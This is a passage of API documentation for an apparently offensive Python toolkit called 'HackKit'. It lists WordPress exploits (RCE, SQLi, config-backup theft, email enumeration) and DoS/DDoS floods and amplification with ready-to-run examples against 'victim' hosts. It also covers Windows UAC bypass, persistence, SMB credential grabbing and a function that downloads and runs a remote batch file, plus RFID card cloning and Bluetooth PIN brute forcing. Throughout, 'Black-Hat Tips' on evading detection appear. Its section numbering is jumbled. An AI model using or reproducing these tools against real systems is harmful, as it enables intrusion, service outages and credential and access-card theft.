| `exploit_plugin_readme(plugin: str) -> Optional[str]`                             | Read plugin readme.txt.                               |                                                     |
| `exploit_theme_stylesheet(theme: str) -> Optional[str]`                           | Read theme style.css.                                 |                                                     |
| `exploit_revslider_rce(upload_file: str) -> str`                                  | Revslider upload RCE.                                 |                                                     |
| `exploit_timthumb_rce(image_url: str) -> str`                                     | Timthumb src RCE.                                     |                                                     |
| `exploit_file_editor(file_path: str, content: str) -> str`                        | Edit plugin via plugin-editor.                        |                                                     |
| `exploit_json_insert(endpoint: str, payload: Dict[str,Any]) -> str`               | Insert via REST.                                      |                                                     |
| `exploit_csv_export(endpoint: str) -> str`                                        | CSV export endpoint.                                  |                                                     |
| `exploit_wp_config_bak() -> Optional[str]`                                        | Download wp-config.php.bak.                           |                                                     |
| `exploit_sitemap_enum() -> List[str]`                                             | Parse sitemap.xml URLs.                               |                                                     |
| `exploit_user_email_leak(max_id: int=10) -> Dict[int,str]`                        | Enumerate user emails.                                |                                                     |
| `exploit_heartbeat_dos(times: int=100) -> None`                                   | Flood heartbeat.                                      |                                                     |
| `exploit_sqli_rest(resource: str, payload: str) -> str`                           | SQLi via REST filtering.                              |                                                     |
| `extract_real_ip() -> Optional[str]`                                              | Return `X-Forwarded-For` or `X-Real-IP` if present.   |                                                     |

##### Example: WordPress Master Example

```python
from HackKit import WordPress

wp = WordPress(target="http://mysite")
# 1) Scan
findings = wp.scan()
print(findings)
# 2) Pingback exploit
print(wp.exploit_pingback(src="http://evil","tgt="http://mysite"))
# 3) Exec command
print(wp.exploit_exec("id"))
# 4) Bruteforce
d = wp.exploit_bruteforce(["admin"],["1234"])
print(d)
# 5) Cron DoS
wp.exploit_cron_dos(threads=50, duration=10)
# 6) Download backup
print(wp.exploit_download_backup("wp-content/backup.zip","backup.zip"))
# 7) Plugin readme
print(wp.exploit_plugin_readme("revslider"))
# 8) Theme stylesheet
print(wp.exploit_theme_stylesheet("twentytwenty"))
# And so on for other methods...
```




































## Table of Contents

20. [DOS](#15-dos)  
21. [WINDOWS](#16-windows)  
22. [BluetoothHunter](#17-bluetoothhunter)  
23. [Decode](#18-decode)  
24. [RFIDWizard](#19-rfIDwizard)  
24. [APKToolkit](#20-apktoolkit)

---

## 29. DOS

> **Cross‑Platform DoS/DDoS Toolkit, OSI‑Layer Organized.** ✅

These are your heavy hitters for taking down networks, servers, and applications. Deploy responsibly… or wreak havoc.

### 29.1 Layer3 – Network Layer Attacks  
> Target the IP layer directly with ICMP & fragmentation.  

- **Cross‑Platform:** ✅ Windows / Linux / macOS (requires raw-socket privileges on non-Windows).

#### `icmp_flood(target: str, threads: int = 10, pps: int = 100, always: bool = True)`  
**What it does:**  
Spams the victim with raw ICMP “ping” packets to saturate network bandwidth and CPU.  

**Parameters:**  
- `target`: `"192.168.1.50"` or `"victim.example.com"`.  
- `threads`: Number of parallel flooders. _Default: 10._  
- `pps`: Packets per second per thread when `always=False`. _Default: 100._  
- `always`: If `True`, floods non-stop; if `False`, paces at `pps`.  

**Black‑Hat Tip:** Vary packet sizes and interleave bursts to evade simple rate-limiters.

**Example – Night Raid:**  
```python
# Unleash relentless flood on the target:
DOS.Layer3.icmp_flood("victim.example.com", threads=20, always=True)

# Stealthy timed bursts (50 pps):
DOS.Layer3.icmp_flood("10.0.0.5", threads=5, pps=50, always=False)
````

#### `teardrop(target: str, threads: int = 5, always: bool = True)`

**What it does:**
Sends overlapping IP fragments that crash or freeze older stacks (Teardrop).

**Example – Vintage Exploit:**

```python
# Exploit legacy OS bug:
DOS.Layer3.teardrop("10.10.10.10", threads=3, always=False)
```

#### `land(target: str, port: int = 80, threads: int = 5, always: bool = True)`

**What it does:**
Sends TCP SYN with identical source/dest, confusing the TCP stack.

**Example – TCP Trickery:**

```python
# Simple Land attack:
DOS.Layer3.land("victim.server.local", port=8080)
```

#### `ping_of_death(target: str, threads: int = 3, always: bool = True)`

**What it does:**
Floods oversized ICMP packets (>65KB) to overflow buffers. Rarely works on modern OS.

**Example – Buffer Bloat:**

```python
DOS.Layer3.ping_of_death("8.8.8.8", threads=2, always=False)
```

---

### 29.2 Layer4 – Transport Layer Attacks

> TCP/UDP floods to exhaust connection tables and bandwidth.

* **Cross‑Platform:** ✅ (Linux/macOS may require root for raw sockets)

#### `syn_flood(target: str, port: int = 80, threads: int = 10, pps: int = 100, always: bool = True)`

**What it does:**
Opens TCP SYN handshakes without completing them, consuming half-open slots.

**Example – SYN Storm:**

```python
# Massive SYN flood on SSH port:
DOS.Layer4.syn_flood("victim.example.com", port=22, threads=50, always=True)

# Controlled SYN flood:
DOS.Layer4.syn_flood("192.168.0.20", port=80, threads=10, pps=200, always=False)
```

#### `ack_flood(target: str, port: int = 80, threads: int = 10, pps: int = 100, always: bool = True)`

**What it does:**
Placeholder invoking SYN flood. True ACK flood requires crafting raw ACK packets.

#### `udp_flood(target: str, port: int = 53, threads: int = 10, pps: int = 200, always: bool = True)`

**What it does:**
Floods UDP port (default DNS) with random payloads.

**Example – DNS UDP Blast:**

```python
DOS.Layer4.udp_flood("dns.victim.net", port=53, threads=20, pps=500)
```

#### `udp_amplification(reflectors: List[str], threads: int = 5, pps: int = 50, always: bool = True)`

**What it does:**
Sends small DNS queries to open resolvers, triggers large responses back to victim.

**Black‑Hat Tip:** Use open resolvers near the victim’s network for maximum effect.

**Example – Amplify:**

```python
reflectors = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
DOS.Layer4.udp_amplification(reflectors, threads=10, pps=100, always=False)
```

---

### 29.3 Layer7 – Application Layer Attacks

> Attack HTTP services directly via GET/POST, Slowloris, HULK.

* **Cross‑Platform:** ✅

#### `http_get_flood(url: str, threads: int = 50, duration: int = 30, headers: Optional[dict] = None, always: bool = True)`

**What it does:**
Sends massive GET requests, simulating thousands of clients.

**Example – HTTP Blitz:**

```python
# 60-second assault:
DOS.Layer7.http_get_flood(
    "http://web.victim.com/index.html",
    threads=200,
    duration=60,
    always=False
)
```

#### `http_post_flood(url: str, data: Optional[dict] = None, threads: int = 50, duration: int = 30, headers: Optional[dict] = None, always: bool = True)`

**What it does:**
Bombards the server with POST payloads, exhausting app logic.

**Example – Brute Login Form:**

```python
DOS.Layer7.http_post_flood(
    "http://victim.com/login",
    data={"username":"admin","password":"wrong"},
    threads=100,
    duration=45,
    headers={"User-Agent":"Mozilla/5.0"},
    always=False
)
```

#### `slowloris(host: str, port: int = 80, sockets: int = 200, interval: int = 15, always: bool = True)`

**What it does:**
Keeps hundreds of HTTP connections half-open by sending partial headers.

**Black‑Hat Tip:** Rotate User‑Agent lines to dodge simple detection.

**Example – Stealth Slowloris:**

```python
DOS.Layer7.slowloris(
    "victim.site", port=80, sockets=500, interval=10, always=False
)
```

#### `slowpost(host: str, path: str = "/", port: int = 80, threads: int = 10, duration: int = 30, always: bool = True)`

**What it does:**
Sends HTTP POST with chunked transfer encoding, very slowly.

#### `hulk(url: str, threads: int = 50, duration: int = 30, always: bool = True)`

**What it does:**
Randomizes query strings to bypass caching/proxies and overwhelm the app.

**Example – HULK Attack:**

```python
DOS.Layer7.hulk(
    "http://victim.app/api/data", threads=100, duration=30, always=True
)
```

---

## 26. WINDOWS

> **Windows‑only Exploitation, Reconnaissance & Persistence.** ❌

### Cross‑Platform: ❌ Windows only (requires `pywin32`, `wmi`, `ctypes`, `winreg`)

---

## 26.1 Exploits

#### `exploit_Active_Windows()`

**What it does:**
Downloads and runs `WA.bat` to perform various Windows-specific post‑exploitation tasks.

**Example:**

```python
WINDOWS.exploit_Active_Windows()
```

#### `exploit_windows_uac_bypass(payload_path: str) -> bool`

**What it does:**
Bypasses UAC via registry hijacking (`fodhelper.exe`, `eventvwr.exe`, or `RunOnce`).

**Example:**

```python
success = WINDOWS.exploit_windows_uac_bypass("C:\\payload.exe")
if success:
    print("UAC Bypass achieved, payload launched!")
```

---

## 26.2 WinRecon

* `enum_users() -> List[str]` – Lists local user accounts.
* `enum_groups() -> Dict[str, List[str]]` – Lists local groups and their members.
* `enum_services() -> List[Dict[str,str]]` – Enumerates services (`Name`, `State`, `StartMode`, `Path`).
* `enum_patches() -> List[Dict[str,str]]` – Lists applied HotFixes (`HotFixID`, `InstalledOn`).

**Example – Service Recon:**

```python
services = WINDOWS.WinRecon.enum_services()
for svc in services:
    if svc["StartMode"] == "Auto":
        print(f'{svc["Name"]} – {svc["State"]}')
```

---

## 26.3 WinShares

* `scan_shares(target: str) -> List[str]` – Discovers SMB shares on `\\target`.
* `access_test(share: str, username: str, password: str) -> bool` – Tests credentials without persistence.
* `download_file(src_path: str, dst_path: str) -> bool` – Grabs a file from a share.

**Example – Dump Secrets:**

```python
shares = WINDOWS.WinShares.scan_shares("192.168.0.50")
if "SecretShare" in shares:
    WINDOWS.WinShares.access_test("192.168.0.50\\SecretShare", "user","pass")
    WINDOWS.WinShares.download_file("\\\\192.168.0.50\\SecretShare\\creds.txt","C:\\temp\\creds.txt")
```

---

## 26.4 Privilege Escalation

* `WinPrivesc.uac_bypass_fodhelper(payload: str) -> None`
* `WinPrivesc.unquoted_service_paths() -> List[str]` – Finds services with insecure paths.
* `WinPrivesc.weak_acl(path: str) -> bool` – Checks if current user can write to `path`.
* `WinPrivesc.schtasks_abuse(name: str, command: str) -> bool` – Creates a task to run on logon.

---

## 26.5 Persistence

* `WinPersistence.add_run_key(name: str, command: str) -> None` – Adds a Run key in HKCU.
* `WinPersistence.add_scheduled_task(name: str, command: str, trigger: str) -> bool` – Schedules a task (ATLOGON, DAILY, etc.).

---

## 26.6 Networking & AV Detection

* `WinNetwork.ping(target: str, count: int) -> List[str]` – Cross‑platform ping wrapper.
* `WinNetwork.scan_port(target: str, port: int, timeout: float) -> bool` – TCP connect scan.
* `WinDetectAV.list_av_processes() -> List[str]` – Looks for common AV processes via `tasklist`.

---

## 22. BluetoothHunter

> **Cross‑Platform Bluetooth Toolkit:** BLE scanning, PIN brute, HCI sniff, BLE DoS. ✅

* `scan_le(duration: int = 10) -> List[Dict[str,str]]` – BLE LE discovery.
* `brute_pair_pin(address: str, pin_list: List[str], timeout: float = 5.0) -> Optional[str]` – RFCOMM PIN brute-force.
* `sniff_hci(interface: str = None, timeout: int = 30) -> List` – Captures raw HCI packets (Linux).
* `dos_le(address: str, duration: int = 30, threads: int = 20)` – Rapid connect/disconnect DoS.

**Example – BLE Assault:**

```python
# Discover devices
devices = BluetoothHunter.scan_le(15)
# Bruteforce simple PINs
pin = BluetoothHunter.brute_pair_pin(devices[0]["address"], ["0000","1234","1111"])
```

---

## 27. Decode

> **High‑speed Decoding & Hash‑Cracking Utilities.** ✅

* `base64_decode(data: str, urlsafe: bool = True) -> bytes` – Auto‑pad, URL‑safe support.
* `hex_decode(data: str) -> bytes` – Strips spaces/0x, decodes.
* `url_decode(data: str, encoding: str = 'utf-8') -> str` – Repeated unquote until stable.
* `rot13(data: str) -> str` – Classic ROT13.
* `js_unescape(data: str) -> str` – Converts `\xHH` and `\uHHHH`.
* `strings(data: bytes, min_len: int = 4) -> List[str]` – Extracts printable runs.
* `md5_crack(hash_list: List[str], wordlist: str, procs: int = None) -> Dict[str,str]` – Multi‑proc MD5 cracking.
* `sha1_crack(...)`, `sha256_crack(...)`, `ntlm_crack(...)`, `bcrypt_crack(...)`.

**Example – Crack & Decode:**

```python
# Decode embedded URL
print(Decode.url_decode("%252fadmin%252flogin"))

# Crack NTLM hashes
hashes = ["AABBCCDDEEFF00112233445566778899"]
res = Decode.ntlm_crack(hashes, "wordlist.txt")
```

---

## 28. RFIDWizard

> **RFID/NFC Toolkit:** sniff ISO14443, brute MIFARE keys, clone, emulate, relay. ✅

* `sniff_iso14443(timeout: int = 10) -> List[Dict[str,str]]` – Tag discovery.
* `brute_mifare_keys(uid: str, keyfile: Optional[str] = None, processes: int = None) -> Optional[bytes]` – Brute default or custom keys.
* `clone_mifare_classic(key: bytes, dump_file: str) -> bool` – Dump and save card memory.
* `emulate_card(dump_file: str, reader_port: str = None) -> bool` – Emulate a cloned tag.
* `relay_nfc(reader_a: str, reader_b: str, timeout: int = 60) -> None` – NFC relay between two interfaces.

**Example – Clone Access Card:**

```python
tags = RFIDWizard.sniff_iso14443(5)
key = RFIDWizard.brute_mifare_keys(tags[0]["uid"])
if key:
    RFIDWizard.clone_mifare_classic(key, "dump.bin")
```

---

## 29. APKToolkit

> **Android APK Analyzer & Modifier.** ✅

* `extract_manifest(apk_path: str) -> Dict[str,List[str]]` – Parses manifest for package, activities, permissions.
* `find_hardcoded_strings(apk_path: str, min_len: int = 8) -> List[str]` – Finds URLs, secrets in code.
* `patch_ssl_pinning(apk_path: str, out_dir: str) -> None` – Decompile, patch `checkServerTrusted`, rebuild & sign.
* `dynamic_instrument(apk_path: str, frida_script: str) -> None` – Installs & injects Frida script at runtime.

**Example – Inspect & Patch:**

```python
info = APKToolkit.extract_manifest("app-release.apk")
print("Permissions:", info["permissions"])
APKToolkit.patch_ssl_pinning("app-release.apk", "out-smali")
```

---

*— HackKit: Because real hackers demand perfection.*

```
```




